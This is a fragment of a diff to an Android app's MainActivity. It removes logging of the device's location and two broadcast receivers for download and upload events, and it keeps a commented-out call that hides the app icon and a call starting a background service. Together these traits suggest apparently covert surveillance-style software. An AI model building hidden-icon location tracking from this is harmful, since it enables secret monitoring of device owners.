@@ -76,22 +76,8 @@ public class MainActivity extends AppCompatActivity {
             } catch (JSONException e) {}
         }
 
-        Log.e("eeee", String.valueOf(Location.getAltitude(getApplicationContext())));
-        Log.e("eeee", String.valueOf(Location.getLatitude(getApplicationContext())));
-        Log.e("eeee", String.valueOf(Location.getLongitude(getApplicationContext())));
-
 //        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
-
-        // Download complete broadcast receiver
-        MainService.DownloadComplete downloadCompleteReceiver = new MainService.DownloadComplete();
-        IntentFilter downloadCompleteFilter = new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE");
-        registerReceiver(downloadCompleteReceiver, downloadCompleteFilter);
-
-        // Complete upload broadcast receiver
-        MainService.UploadComplete uploadCompleteReceiver = new MainService.UploadComplete();
-        IntentFilter uploadCompleteFilter = new IntentFilter("upload_complete");
-        registerReceiver(uploadCompleteReceiver, uploadCompleteFilter);
     }
 
     /**
